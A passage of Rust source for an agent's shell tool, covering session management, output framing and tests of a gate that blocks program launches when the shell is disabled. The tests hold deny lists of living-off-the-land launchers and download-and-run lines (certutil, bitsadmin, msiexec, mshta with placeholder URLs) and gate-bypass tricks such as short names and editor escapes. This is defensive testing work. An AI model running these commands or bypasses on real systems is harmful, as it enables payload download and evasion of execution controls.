                "note": "command #".to_string() + &nonce.to_string() + " still running; call op=read to collect the rest",
            }))
        }
        ReadOutcome::Stopped => {
            end_own_on_stop();
            let _ = sess.child.start_kill();
            forget(shells, &id, slot);
            Err(GhostError::Stopped)
        }
        ReadOutcome::Killed => {
            // op=kill already forgot the session and ends the shell once this
            // call lets go of it.
            Err(GhostError::Config(format!(
                "ghost_shell: session '{id}' was killed while command #{nonce} ran"
            )))
        }
        ReadOutcome::Eof { output } => {
            // Driver process exited unexpectedly. Drop the dead session.
            let _ = sess.child.start_kill();
            forget(shells, &id, slot);
            if ended_by_stop(sess.born_gen) {
                return Err(ended_by_stop_error());
            }
            let (output, _) = cap_output(output);
            Err(GhostError::Config(format!(
                "ghost_shell: session '{id}' ended unexpectedly. Partial output: {output}"
            )))
        }
    }
}

fn shell_list(shells: &Mutex<ShellRegistry>) -> Value {
    let mut reg = shells.lock().unwrap();
    let mut sessions = Vec::new();
    let mut dead = Vec::new();
    for (id, slot) in &reg.sessions {
        // A call holding the shell is running a command in it: busy. An idle
        // shell that has exited (a stop ended it, or it crashed) is dead:
        // forget it rather than list it as usable.
        let (busy, commands_run) = match slot.shell.try_lock() {
            Ok(mut s) => {
                if !matches!(s.child.try_wait(), Ok(None)) {
                    dead.push(id.clone());
                    continue;
                }
                (s.pending.is_some(), Value::from(s.nonce))
            }
            Err(_) => (true, Value::Null),
        };
        sessions.push(json!({
            "id": id,
            "pid": slot.pid,
            "busy": busy,
            "age_ms": slot.created.elapsed().as_millis() as u64,
            "commands_run": commands_run,
        }));
    }
    for id in dead {
        reg.sessions.remove(&id);
    }
    json!({ "ok": true, "sessions": sessions })
}

async fn shell_kill(shells: &Mutex<ShellRegistry>, args: &Value) -> Result<Value> {
    let id = args
        .get("id")
        .and_then(|v| v.as_str())
        .ok_or_else(|| GhostError::Config("ghost_shell op=kill: missing 'id'".into()))?
        .to_string();
    let slot = shells
        .lock()
        .unwrap()
        .sessions
        .remove(&id)
        .ok_or_else(|| GhostError::Config(format!("ghost_shell: no session '{id}'")))?;
    // A call running a command in it notices within one read slice and lets go.
    slot.killed.store(true, Ordering::Release);
    // End the process first: a call holding the session (a send blocked in a
    // read) must not keep the shell running while kill waits for the lock.
    // The pid cannot have been reused - the session still owns the child.
    end_group(slot.group);
    #[cfg(windows)]
    if let Some(pid) = slot.pid {
        let _ = ghost_core::process::kill(pid);
    }
    let mut sess = slot.shell.lock().await;
    let group = sess.group.clone();
    end_shell(&mut sess.child, group);
    let _ = sess.child.wait().await;
    Ok(json!({ "ok": true, "id": id, "killed": true }))
}

enum ReadOutcome {
    Done { output: String, exit_code: Option<i64> },
    TimedOut { output: String },
    Stopped,
    /// `op=kill` ended the session while this read was waiting on it.
    Killed,
    Eof { output: String },
}

/// A value the shell session's own output cannot predict.
///
/// `RandomState` is seeded by the OS per process and differs per instance, so
/// two sessions in one process do not share a secret either. This is framing
/// integrity, not cryptography: it has to be unguessable by a command that is
/// merely printing text, and 64 bits of OS entropy is far past that bar.
fn session_secret() -> String {
    use std::hash::{BuildHasher, Hasher};
    let mut h = std::collections::hash_map::RandomState::new().build_hasher();
    h.write_u64(0x9E37_79B9_7F4A_7C15);
    format!("{:016x}", h.finish())
}

/// The nonce field for one command: secret plus counter, no whitespace, so both
/// the bash and PowerShell drivers can echo it back as a single token.
fn sentinel_token(secret: &str, nonce: u64) -> String {
    format!("{secret}x{nonce}")
}

/// Read lines from the session until the nonce-stamped sentinel appears, the
/// deadline passes, the stop flag fires, or stdout hits EOF. Everything before
/// the sentinel is the command's merged output.
///
/// The deadline is checked after a read attempt, never before one: output the
/// shell already wrote is collected for up to `DRAIN_GRACE_MS` past the
/// deadline, so a zero-wait read of a finished command returns it.
async fn read_until_sentinel(sess: &mut ShellSession, token: &str, dur: Duration) -> ReadOutcome {
    let sentinel = format!("__GHOST_DONE_{token}__ ");
    let deadline = Instant::now() + dur;
    let hard_end = deadline + Duration::from_millis(DRAIN_GRACE_MS);
    let mut output = String::new();

    loop {
        if crate::engine::input::hotkey::is_stopped() {
            return ReadOutcome::Stopped;
        }
        if sess.killed.load(Ordering::Acquire) {
            return ReadOutcome::Killed;
        }
        let now = Instant::now();
        if now >= hard_end {
            return ReadOutcome::TimedOut { output };
        }
        let slice = (hard_end - now).min(Duration::from_millis(POLL_MS));
        match tokio::time::timeout(slice, sess.reader.read_until(b'\n', &mut sess.partial)).await {
            // op=kill ends the process before it can take the session, so an
            // EOF after a kill is that kill, not the shell exiting.
            Ok(Ok(0)) | Ok(Err(_)) if sess.killed.load(Ordering::Acquire) => return ReadOutcome::Killed,
            Ok(Ok(0)) => {
                // EOF: the driver exited. A last line with no newline is output too.
                output.push_str(&String::from_utf8_lossy(&std::mem::take(&mut sess.partial)));
                return ReadOutcome::Eof { output };
            }
            Ok(Ok(_)) => {
                if sess.partial.last() != Some(&b'\n') {
                    continue; // EOF mid-line: the next read reports it
                }
                let line = String::from_utf8_lossy(&std::mem::take(&mut sess.partial)).into_owned();
                if let Some(rest) = line.strip_prefix(&sentinel) {
                    let exit_code = rest.trim().parse::<i64>().ok();
                    return ReadOutcome::Done { output, exit_code };
                }
                output.push_str(&line);
            }
            Ok(Err(_)) => return ReadOutcome::Eof { output }, // pipe error
            Err(_) => {
                // Nothing arrived in this slice. Past the deadline, that means
                // everything already written has been drained.
                if Instant::now() >= deadline {
                    return ReadOutcome::TimedOut { output };
                }
            }
        }
    }
}

/// Resolve on the next stop-flag rising edge. Polls the atomic on POLL_MS.
async fn wait_for_stop() {
    loop {
        if crate::engine::input::hotkey::is_stopped() {
            return;
        }
        tokio::time::sleep(Duration::from_millis(POLL_MS)).await;
    }
}

/// Prepended to one-shot PowerShell commands: silence the progress stream so
/// "Preparing modules for first use" and friends don't leak as CLIXML on stderr.
/// Runs as the first statement, so the user's own `exit N` still propagates.
const PS_ONESHOT_PREAMBLE: &str = "$ProgressPreference='SilentlyContinue';\n";

/// Extract readable text from PowerShell CLIXML stderr, dropping the envelope.
/// Native (non-PowerShell) stderr has no CLIXML marker and passes through as-is.
fn sanitize_ps_stderr(s: &str) -> String {
    if !s.contains("#< CLIXML") {
        return s.to_string();
    }
    // CLIXML error records store their message in <S ...>text</S> string nodes.
    let mut out = String::new();
    let mut rest = s;
    while let Some(open) = rest.find("<S ") {
        let after = &rest[open..];
        if let (Some(gt), Some(close)) = (after.find('>'), after.find("</S>")) {
            if gt < close {
                let text = &after[gt + 1..close];
                out.push_str(&xml_unescape(text));
                rest = &after[close + 4..];
                continue;
            }
        }
        break;
    }
    out
}

fn xml_unescape(s: &str) -> String {
    s.replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&amp;", "&")
        .replace("&quot;", "\"")
        .replace("&apos;", "'")
        .replace("_x000D_", "")
        .replace("_x000A_", "\n")
}

/// Build a one-shot command for the requested shell.
fn build_oneshot(shell: &str, cmd: &str) -> Result<Command> {
    #[allow(unused_mut)]
    let mut c = match shell {
        // POSIX shells. `-c` takes the script as one argument, so no quoting of
        // the user's command is needed or performed.
        "bash" | "sh" | "zsh" => {
            let mut c = Command::new(shell);
            c.args(["-c", cmd]);
            c
        }
        "powershell" => {
            let mut c = Command::new("powershell");
            c.args(["-NoProfile", "-NoLogo", "-NonInteractive", "-EncodedCommand"])
                .arg(ps_encoded_command(&format!("{PS_ONESHOT_PREAMBLE}{cmd}")));
            c
        }
        "pwsh" => {
            let mut c = Command::new("pwsh");
            c.args(["-NoProfile", "-NoLogo", "-NonInteractive", "-EncodedCommand"])
                .arg(ps_encoded_command(&format!("{PS_ONESHOT_PREAMBLE}{cmd}")));
            c
        }
        "cmd" => {
            let mut c = Command::new("cmd");
            c.args(["/S", "/C", cmd]);
            c
        }
        other => {
            let supported = if cfg!(target_os = "linux") {
                "bash|sh|zsh|pwsh"
            } else {
                "powershell|pwsh|cmd"
            };
            return Err(GhostError::Config(format!(
                "ghost_shell: unknown shell '{other}'; use {supported}"
            )))
        }
    };
    no_console_window(&mut c);
    // Reap the shell's own process tree isn't attempted here; grandchildren of a
    // Start-Process launch are intentionally left running.
    c.kill_on_drop(true);
    Ok(c)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn b64_matches_known_vectors() {
        assert_eq!(b64_encode(b""), "");
        assert_eq!(b64_encode(b"f"), "Zg==");
        assert_eq!(b64_encode(b"fo"), "Zm8=");
        assert_eq!(b64_encode(b"foo"), "Zm9v");
        assert_eq!(b64_encode(b"foob"), "Zm9vYg==");
        assert_eq!(b64_encode(b"fooba"), "Zm9vYmE=");
        assert_eq!(b64_encode(b"foobar"), "Zm9vYmFy");
    }

    #[test]
    fn ps_encoded_is_utf16le_base64() {
        // "A" -> UTF-16LE bytes 0x41 0x00 -> base64 "QQA="
        assert_eq!(ps_encoded_command("A"), "QQA=");
    }

    #[test]
    fn cap_output_passes_short_strings() {
        let (s, t) = cap_output("hello".into());
        assert_eq!(s, "hello");
        assert!(!t);
    }

    #[test]
    fn cap_output_truncates_long_strings() {
        let big = "x".repeat(MAX_OUTPUT_CHARS + 500);
        let (s, t) = cap_output(big);
        assert!(t);
        assert!(s.contains("truncated"));
        assert!(s.chars().count() <= MAX_OUTPUT_CHARS + 40);
    }

    #[test]
    fn clamp_timeout_defaults_and_caps() {
        assert_eq!(clamp_timeout(None), Duration::from_millis(DEFAULT_TIMEOUT_MS));
        assert_eq!(clamp_timeout(Some(999_999_999)), Duration::from_millis(MAX_TIMEOUT_MS));
        assert_eq!(clamp_timeout(Some(1500)), Duration::from_millis(1500));
    }

    #[test]
    fn sanitize_passes_plain_native_stderr() {
        let s = "fatal: not a git repository\n";
        assert_eq!(sanitize_ps_stderr(s), s);
    }

    #[test]
    fn sanitize_strips_clixml_progress_to_empty() {
        let clixml = "#< CLIXML\r\n<Objs Version=\"1.1.0.1\"><Obj S=\"progress\"><TN><T>x</T></TN></Obj></Objs>";
        // A pure progress record has no <S ...> text nodes -> nothing readable.
        assert_eq!(sanitize_ps_stderr(clixml), "");
    }

    #[test]
    fn sanitize_extracts_clixml_error_text() {
        let clixml = "#< CLIXML\r\n<Objs><S S=\"Error\">boom went _x000A_the thing</S></Objs>";
        assert_eq!(sanitize_ps_stderr(clixml), "boom went \nthe thing");
    }

    #[test]
    fn shell_off_accepts_the_spellings_a_checkbox_writes() {
        // The documented spelling, and what an mcpb boolean actually renders.
        for off in ["off", "OFF", " off ", "false", "0", "no", "disabled"] {
            assert!(shell_off_value(Some(off)), "{off:?} should turn the shell off");
        }
        // On, or nothing said at all: the capability stays, because it is the
        // point of the tool and only a clear refusal should remove it.
        for on in [None, Some(""), Some("on"), Some("true"), Some("1"), Some("yes"), Some("garbage")] {
            assert!(!shell_off_value(on), "{on:?} should leave the shell on");
        }
    }

    fn no_resolve(_: &str) -> Option<String> {
        None
    }

    #[test]
    fn launch_gate_refuses_interpreters_and_inline_script() {
        let refused = [
            "cmd", "cmd.exe", "CMD.EXE /c calc", r"C:\Windows\System32\cmd.exe", r#""C:\Windows\System32\cmd.exe" /k"#,
            "powershell", "PowerShell.exe -NoProfile", "pwsh -c x", "wscript x.vbs", "cscript", "mshta http://x",
            "rundll32 a,b", "regsvr32 /s x.dll", "bash", "sh -c id", "wsl", "python -c 1", "python3.11", "Pythonw.exe",
            "node -e 1", "C:/Windows/System32/cmd.exe", "cmd. /c x", "run.bat", "x.ps1", "wt",
            "somebinary -EncodedCommand AAAA", "tool /c dir", "tool /K dir", "tool -Command x",
            r#""C:\Program Files\PowerShell\7\pwsh.exe""#,
        ];
        for c in refused {
            let e = launch_allowed_with_shell_off(c, None, &no_resolve).expect_err(c);
            assert!(e.contains("GHOST_SHELL=off"), "{c}: {e}");
        }
    }

    #[test]
    fn launch_gate_allows_plain_apps() {
        for c in ["notepad", "notepad.exe", r"notepad C:\x.txt", r#""C:\Program Files\App\app.exe" --flag"#,
                  "calc", "mspaint.exe /pt", r#"notepad "C:\a b\cmd.txt""#, "msedge --new-window"] {
            assert!(launch_allowed_with_shell_off(c, None, &no_resolve).is_ok(), "{c}");
        }
    }

    #[test]
    fn launch_gate_empty_is_refused() {
        assert!(launch_allowed_with_shell_off("  ", None, &no_resolve).is_err());
    }

    #[test]
    fn shell_disabled_reads_env() {
        std::env::set_var("GHOST_SHELL", "off");
        assert!(shell_disabled());
        std::env::set_var("GHOST_SHELL", "OFF");
        assert!(shell_disabled());
        std::env::remove_var("GHOST_SHELL");
        assert!(!shell_disabled());
    }
}

#[cfg(test)]
mod launch_gate_tests {
    use super::*;

    fn no_resolve(_: &str) -> Option<String> {
        None
    }

    fn gate(c: &str) -> std::result::Result<(), String> {
        launch_allowed_with_shell_off(c, None, &no_resolve)
    }

    #[test]
    fn short_names_resolve_to_the_long_program_name() {
        // 8.3 names hide the basename from a text check; the resolver gives
        // the long path, as GetLongPathNameW does.
        let resolve = |p: &str| {
            p.to_ascii_uppercase()
                .contains("POWERS~1")
                .then(|| r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".to_string())
        };
        let c = r#"C:\WINDOWS\system32\WINDOW~1\v1.0\POWERS~1.EXE Get-Date"#;
        let e = launch_allowed_with_shell_off(c, None, &resolve).expect_err(c);
        assert!(e.contains("powershell"), "{e}");
    }

    #[test]
    fn unresolvable_short_names_are_refused() {
        let c = r#"C:\WINDOWS\system32\WINDOW~1\v1.0\POWERS~1.EXE Get-Date"#;
        assert!(gate(c).is_err(), "{c}");
    }

    #[test]
    fn powershell_flag_prefixes_are_refused() {
        for flag in [
            "-co", "-comm", "-command", "-en", "-encodedc", "-e", "-ec", "/c", "/co", "/encodedcommand",
            "\u{2013}co", "\u{2014}command", "--command", "-cwa", "-commandwithargs", "-fi", "-file", "/file",
            "-CO", "-EnC",
        ] {
            let c = format!("tool {flag} x");
            assert!(gate(&c).is_err(), "{c}");
        }
    }

    #[test]
    fn cmd_switches_are_refused_in_any_case_and_glued() {
        for c in ["cmd /r calc", "tool /R x", "tool /K x", "tool /ccalc", "tool /kdir", "tool /Rcalc"] {
            assert!(gate(c).is_err(), "{c}");
        }
    }

    #[test]
    fn proxy_launchers_are_refused() {
        for c in [
            r#"wmic process call create "cmd /r calc""#,
            r"explorer.exe C:\Windows\System32\cmd.exe",
            "pcalua -a cmd.exe",
            r#"forfiles /p C:\Windows /m win.ini /c "calc""#,
            "schtasks /create /tn x /tr calc /sc once /st 00:00",
            "msiexec /i http://x/y.msi",
            "mmc x.msc",
            "hh.exe x.chm",
            "msbuild x.proj",
            "installutil x.dll",
            "cmstp /s x.inf",
            "certutil -urlcache -f http://x/y y.exe",
            r"bitsadmin /transfer x http://x/y C:\y.exe",
            r"runas /user:x notepad",
            "ssh localhost",
            "pcalua.exe -a notepad",
        ] {
            assert!(gate(c).is_err(), "{c}");
        }
    }

    #[test]
    fn linux_terminals_shells_and_wrappers_are_refused() {
        for c in [
            "gnome-terminal", "konsole", "xterm", "x-terminal-emulator", "fish", "dash", "ksh", "tcsh",
            "gtk-launch evil", "xdg-open /tmp/x.desktop", "xdg-open /tmp/x.sh", "env calc", "nohup calc",
            "setsid calc", "busybox sh", "/usr/bin/env FOO=1 calc", "/bin/dash",
        ] {
            assert!(gate(c).is_err(), "{c}");
        }
    }

    #[test]
    fn symlinked_names_are_judged_by_their_target_too() {
        // /usr/bin/x-terminal-emulator -> gnome-terminal.wrapper, /bin/sh -> dash.
        let resolve = |p: &str| match p {
            "termapp" => Some("/usr/bin/gnome-terminal.wrapper".to_string()),
            "/usr/local/bin/myshell" => Some("/usr/bin/dash".to_string()),
            _ => None,
        };
        for c in ["termapp", "/usr/local/bin/myshell"] {
            assert!(launch_allowed_with_shell_off(c, None, &resolve).is_err(), "{c}");
        }
    }

    #[test]
    fn plain_applications_still_launch() {
        let resolve = |p: &str| match p.to_ascii_lowercase().as_str() {
            "notepad" => Some(r"C:\Windows\System32\notepad.exe".to_string()),
            "mspaint" => Some(r"C:\Windows\System32\mspaint.exe".to_string()),
            _ => None,
        };
        for c in ["notepad", r"notepad C:\x.txt", "mspaint", r#""C:\Program Files\App\app.exe" --profile x"#,
                  "msedge https://example.com/bash", r#"notepad "C:\a b\cmd.txt""#] {
            assert!(launch_allowed_with_shell_off(c, None, &resolve).is_ok(), "{c}");
            assert!(gate(c).is_ok(), "{c} (unresolved)");
        }
    }

    #[test]
    fn allowlist_admits_only_listed_programs() {
        let allow = parse_launch_allow(Some(r" notepad , C:\Tools\viewer.exe ,,")).expect("allowlist");
        let resolve = |p: &str| match p.to_ascii_lowercase().as_str() {
            "notepad" | "notepad.exe" => Some(r"C:\Windows\System32\notepad.exe".to_string()),
            _ => None,
        };
        let ok = |c: &str| launch_allowed_with_shell_off(c, Some(&allow), &resolve);
        for c in ["notepad", r"notepad C:\x.txt", "NOTEPAD.EXE", r"C:\Tools\viewer.exe", r#""c:\tools\VIEWER.exe" a.png"#] {
            assert!(ok(c).is_ok(), "{c}: {:?}", ok(c));
        }
        for c in ["mspaint", "calc", r"C:\Other\viewer.exe", r"C:\Tools\viewer2.exe", "cmd /c x"] {
            let e = ok(c).expect_err(c);
            assert!(e.contains("GHOST_LAUNCH_ALLOW") || e.contains("inline script"), "{c}: {e}");
        }
        assert!(ok("mspaint").unwrap_err().contains("GHOST_LAUNCH_ALLOW"));
    }

    /// The PowerShell/cmd switch scan exists for interpreters and programs it
    /// cannot see. A program that resolved to a plain application, or one the
    /// operator allowlisted, keeps its own `-c` / `/k` / `-C` meanings.
    #[test]
    fn switches_of_resolved_plain_programs_and_allowlisted_ones_are_not_script() {
        let resolve = |p: &str| {
            let stem = p.to_ascii_lowercase();
            ["ffmpeg", "gcc", "git", "tar", "vim", "robocopy", "app", "notepad"]
                .contains(&stem.as_str())
                .then(|| format!(r"C:\t\{stem}.exe"))
        };
        assert_eq!(launch_allowed_with_shell_off("ffmpeg -c:v x", Some(&["ffmpeg".into()]), &|_| Some(r"C:\t\ffmpeg.exe".into())), Ok(()));
        assert_eq!(launch_allowed_with_shell_off("notepad -command x", Some(&["notepad".into()]), &resolve), Ok(()));
        for c in ["ffmpeg -i a.mp4 -c:v libx264 b.mp4", "gcc -c x.c",
                  "robocopy a b /r:1", "app /k", "app /c x", "app -encodedcommand x", "app -File x"] {
            assert_eq!(launch_allowed_with_shell_off(c, None, &resolve), Ok(()), "{c}");
        }
        // Programs that run shell commands from their own options (an editor's
        // `:!cmd`, git aliases, pagers and ssh commands) are refused by name,
        // whatever the switch scan says; GHOST_LAUNCH_ALLOW can still allow them.
        for c in ["vim -c \"!calc\"", "vi x", "nvim -c q", "gvim", "view x", "git -c alias.x=!calc x",
                  "git -c core.pager=calc log", "git -C dir status", "less x", "man ls", "gdb -ex shell",
                  "emacs --eval x", "nano x", "ed x", "ex x", "rvim x", "vimdiff a b", "tmux", "screen",
                  "lldb x", "cdb x", "windbg x", "psql -c x", "sqlite3 -cmd x", "mysql -e x",
                  "awk BEGIN{system(x)}", "gawk x", "tar --to-command=x -xf a.tar", "zip -TT x a.zip a"] {
            assert!(launch_allowed_with_shell_off(c, None, &resolve).is_err(), "{c} was allowed");
        }
        // Allowlisted, git launches, but it is still a launcher: its `-c`/`-C`
        // stay refused, as an allowlisted interpreter's inline script does.
        assert_eq!(launch_allowed_with_shell_off("git status", Some(&["git".into()]), &resolve), Ok(()));
        assert!(launch_allowed_with_shell_off("git -c alias.x=!calc x", Some(&["git".into()]), &resolve).is_err());
        // Still refused: an interpreter named as an argument to a program
        // that resolved (a proxy launcher Ghost does not know about).
        for c in ["app cmd /c calc", "app powershell -c x", "app pwsh.exe"] {
            assert!(launch_allowed_with_shell_off(c, None, &resolve).is_err(), "{c}");
        }
        // An allowlisted interpreter still may not be handed inline script.
        let pwsh = |_: &str| Some(r"C:\p\pwsh.exe".to_string());
        assert!(launch_allowed_with_shell_off("pwsh -c x", Some(&["pwsh".into()]), &pwsh).is_err());
        assert_eq!(launch_allowed_with_shell_off("pwsh x.txt", Some(&["pwsh".into()]), &pwsh), Ok(()));
    }

    /// The body of `fn_sig` in `src`, up to the end of the function.
    fn body<'a>(src: &'a str, fn_sig: &str) -> &'a str {
        let start = src.find(fn_sig).unwrap_or_else(|| panic!("{fn_sig} not found"));
        &src[start..start + src[start..].find("\n    }").expect("end of fn")]
    }

    fn gate_before(src: &str, fn_sig: &str, spawn: &str) {
        let b = body(src, fn_sig);
        let gate = b.find("ensure_launch_allowed(").unwrap_or_else(|| panic!("no launch gate in {fn_sig}"));
        let spawn_at = b.find(spawn).unwrap_or_else(|| panic!("no '{spawn}' in {fn_sig}"));
        assert!(gate < spawn_at, "the launch gate must come before the spawn in {fn_sig}:\n{b}");
    }

    #[test]
    fn every_launch_verb_checks_the_gate_before_spawning() {
        gate_before(include_str!("session.rs"), "pub async fn launch(&self", "proc_launch(");
        gate_before(include_str!("hidden.rs"), "pub async fn launch_hidden(", "d.launch(");
        gate_before(include_str!("registries.rs"), "pub async fn desktop_launch(", ".launch(command)");
    }

    #[test]
    fn the_gate_uses_the_real_resolver_and_the_allowlist() {
        let b = body(include_str!("shell.rs"), "pub(crate) fn ensure_launch_allowed(");
        assert!(b.contains("&resolve_program"), "{b}");
        assert!(b.contains("GHOST_LAUNCH_ALLOW"), "{b}");
    }

    #[test]
    fn allowlist_unset_or_blank_is_none() {
        for v in [None, Some(""), Some(" , ,")] {
            assert!(parse_launch_allow(v).is_none(), "{v:?}");
        }
    }

    #[cfg(windows)]
    #[test]
    fn windows_resolver_finds_system_programs_by_bare_name() {
        // Reads the file system only: SearchPathW plus GetLongPathNameW.
        let p = resolve_program("notepad").expect("notepad resolves");
        assert!(p.to_ascii_lowercase().ends_with(r"\notepad.exe"), "{p}");
        assert!(resolve_program("ghost-no-such-program-xyzzy").is_none());
    }

    #[cfg(windows)]
    #[test]
    fn windows_resolver_expands_a_real_short_path() {
        use windows::core::HSTRING;
        use windows::Win32::Storage::FileSystem::GetShortPathNameW;
        let dir = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
        let long = format!(r"{dir}\System32\WindowsPowerShell\v1.0\powershell.exe");
        let mut buf = [0u16; 520];
        let n = unsafe { GetShortPathNameW(&HSTRING::from(long.as_str()), Some(&mut buf)) } as usize;
        if n == 0 || n >= buf.len() {
            eprintln!("SKIP: no short name available");
            return;
        }
        let short = String::from_utf16_lossy(&buf[..n]);
        if !short.contains('~') {
            eprintln!("SKIP: 8.3 names are disabled on this volume ({short})");
            return;
        }
        let resolved = resolve_program(&short).expect("short path resolves");
        assert!(resolved.to_ascii_lowercase().ends_with(r"\powershell.exe"), "{short} -> {resolved}");
        let e = launch_allowed_with_shell_off(&format!("{short} Get-Date"), None, &resolve_program).expect_err(&short);
        assert!(e.contains("powershell"), "{e}");
    }
}

#[cfg(test)]
mod warm_tests {
    use super::*;

    #[test]
    fn cwd_prefix_escapes_single_quotes_for_a_literal_path() {
        assert_eq!(
            cwd_prefix(r"C:\Users\someone\o'neil"),
            r"Set-Location -LiteralPath 'C:\Users\someone\o''neil'; "
        );
    }

    #[test]
    fn warm_flag_reads_env() {
        std::env::set_var("GHOST_SHELL_WARM", "off");
        assert!(warm_disabled());
        std::env::remove_var("GHOST_SHELL_WARM");
        assert!(!warm_disabled());
    }

    /// The mechanism the warm path relies on: a driver process accepts one
    /// framed command, answers with the sentinel and the native exit code, and
    /// the whole exchange is fast once the process is up. Windows only (real
    /// PowerShell); the exit code comes from `cmd /c exit 3`, a native command.
    ///
    /// "Once the process is up" is established by a first exchange, not a
    /// sleep: PowerShell's cold start on a fresh CI runner has taken 11-15 s
    /// (three CI failures, 2026-09-05/06), and a fixed 1.5 s wait charged the
    /// remainder to the command being timed.
    #[cfg(windows)]
    #[test]
    fn a_spare_driver_serves_one_framed_command_with_its_exit_code() {
        let rt = tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
            .unwrap();
        rt.block_on(async {
            let mut sess = spawn_driver(None).expect("spawn driver");
            sess.nonce += 1;
            let warmup = sentinel_token(&sess.secret, sess.nonce);
            let frame = format!("{} {}\n", warmup, b64_encode(b"Write-Output warm-up"));
            sess.stdin.write_all(frame.as_bytes()).await.unwrap();
            sess.stdin.flush().await.unwrap();
            let first = read_until_sentinel(&mut sess, &warmup, Duration::from_secs(90)).await;
            assert!(
                matches!(first, ReadOutcome::Done { .. }),
                "the driver never answered its first command"
            );
            let started = Instant::now();
            sess.nonce += 1;
            let token = sentinel_token(&sess.secret, sess.nonce);
            let frame = format!("{} {}\n", token, b64_encode(b"Write-Output warm-ok; cmd /c exit 3"));
            sess.stdin.write_all(frame.as_bytes()).await.unwrap();
            sess.stdin.flush().await.unwrap();
            let outcome = read_until_sentinel(&mut sess, &token, Duration::from_secs(20)).await;
            let elapsed = started.elapsed();
            let _ = sess.child.start_kill();
            match outcome {
                ReadOutcome::Done { output, exit_code } => {
                    assert!(output.contains("warm-ok"), "output was {output:?}");
                    assert_eq!(exit_code, Some(3));
                }
                other => panic!("expected Done, got {:?}", matches!(other, ReadOutcome::Done { .. })),
            }
            assert!(
                elapsed < Duration::from_millis(1500),
                "a warm command should not cost a process start: {elapsed:?}"
            );
        });
    }
}

#[cfg(test)]
mod stop_reach_tests {
    use super::*;

    /// A shell ended without a stop - even one that exits with the stop's own
    /// exit code - is not reported as ended by a stop.
    /// The watcher acts when the stop rises, and again when the human raises
    /// a stop on top of an agent's (dead servers' programs are only reached
    /// by the human's stop) - not on every tick while stopped.
    #[test]
    fn the_watcher_acts_on_a_stop_and_on_a_human_stop_on_top() {
        use stop_kill::stop_edge;
        assert!(stop_edge(true, false, false, false), "an agent stop rose");
        assert!(stop_edge(true, true, true, false), "the human stopped on top of it");
        assert!(!stop_edge(true, true, true, true), "still stopped: no new edge");
        assert!(!stop_edge(true, true, false, false));
        assert!(!stop_edge(false, true, false, true), "lifted");
    }

    #[test]
    fn only_a_stop_generation_change_counts_as_ended_by_stop() {
        let born = stop_kill::generation();
        assert!(!ended_by_stop(born), "no stop since birth");
        assert!(ended_by_stop(born.wrapping_sub(1)), "a stop happened since birth");
    }

    /// Set in the child copy of this test binary that plays the old server.
    #[cfg(windows)]
    const OLD_SERVER_ENV: &str = "GHOST_TEST_OLD_SHELL_SERVER";

    /// (a) A stop after a server restart still reaches what the old server's
    /// shells started. The child plays the old server: it puts a `ping` in its
    /// named shell job, lists it, and exits. This process plays the new server
    /// and ends the listed jobs, as a shared stop does.
    #[cfg(windows)]
    #[test]
    fn a_stop_after_a_restart_reaches_the_old_servers_shell_children() {
        use std::io::BufRead;
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        if std::env::var_os(OLD_SERVER_ENV).is_some() {
            let ping = std::process::Command::new("ping")
                .args(["-n", "30", "127.0.0.1"])
                .stdout(std::process::Stdio::null())
                .creation_flags(CREATE_NO_WINDOW)
                .spawn()
                .expect("spawn ping");
            platform::confine(Some(ping.id())).expect("confine");
            platform::snapshot(); // the watcher does this within a second
            println!("PING {}", ping.id());
            use std::io::Write;
            let _ = std::io::stdout().flush();
            std::process::exit(0); // the old server is gone; ping is not
        }
        let dir = std::env::temp_dir().join(format!("ghost-test-shell-jobs-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let mut child = std::process::Command::new(std::env::current_exe().unwrap())
            .args(["shell::stop_reach_tests::a_stop_after_a_restart_reaches_the_old_servers_shell_children", "--exact", "--nocapture", "--test-threads=1"])
            .env(OLD_SERVER_ENV, "1")
            .env("GHOST_TEST_SHELL_JOBS_DIR", &dir)
            .stdout(std::process::Stdio::piped())
            .spawn()
            .expect("old server");
        let ping: u32 = std::io::BufReader::new(child.stdout.take().unwrap())
            .lines()
            .map_while(std::result::Result::ok)
            .find_map(|l| l.split("PING ").nth(1).and_then(|p| p.trim().parse().ok()))
            .expect("the old server reported its ping");
        let _ = child.wait();
        let alive = |pid: u32| {
            std::process::Command::new("tasklist")
                .args(["/FI", &format!("PID eq {pid}"), "/NH"])
                .output()
                .map(|o| String::from_utf8_lossy(&o.stdout).contains(&pid.to_string()))
                .unwrap_or(false)
        };
        assert!(alive(ping), "ping should outlive the old server (the job is not kill-on-close)");

        platform::end_all_listed(&dir, 7);
        let deadline = Instant::now() + Duration::from_secs(5);
        while alive(ping) && Instant::now() < deadline {
            std::thread::sleep(Duration::from_millis(100));
        }
        let survived = alive(ping);
        if survived {
            let _ = crate::engine::process::kill(ping);
        }
        let listed_after = std::fs::read_dir(&dir).map(|d| d.count()).unwrap_or(0);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(!survived, "the stop did not reach the old server's shell child (ping {ping})");
        assert_eq!(listed_after, 1, "listed until a later stop finds nothing of it running");
    }

    /// A snapshot is acted on only within 24 hours and the same boot.
    #[cfg(windows)]
    #[test]
    fn snapshots_expire_after_a_day_and_at_reboot() {
        let (now, boot) = (100 * 86_400_000u64, 99 * 86_400_000u64);
        assert!(platform::snapshot_fresh(now - 1_000, boot, now, boot));
        assert!(platform::snapshot_fresh(now - 86_400_000, boot, now, boot + 30_000), "boot slack");
        assert!(!platform::snapshot_fresh(now - 86_400_001, boot, now, boot), "older than a day");
        assert!(!platform::snapshot_fresh(now - 1_000, boot - 3_600_000, now, boot), "another boot");
    }

    /// An expired snapshot that still lists a live process in a job: a stop
    /// leaves the process alone and drops the file.
    #[cfg(windows)]
    #[test]
    fn an_expired_snapshot_kills_nothing_and_is_dropped() {
        use std::os::windows::process::CommandExt;
        let mut ping = std::process::Command::new("ping")
            .args(["-n", "30", "127.0.0.1"])
            .stdout(std::process::Stdio::null())
            .creation_flags(0x0800_0000)
            .spawn()
            .expect("ping");
        let job = ghost_browser::launch::job::Job::new_terminable().expect("job");
        job.adopt(ping.id()).expect("adopt");
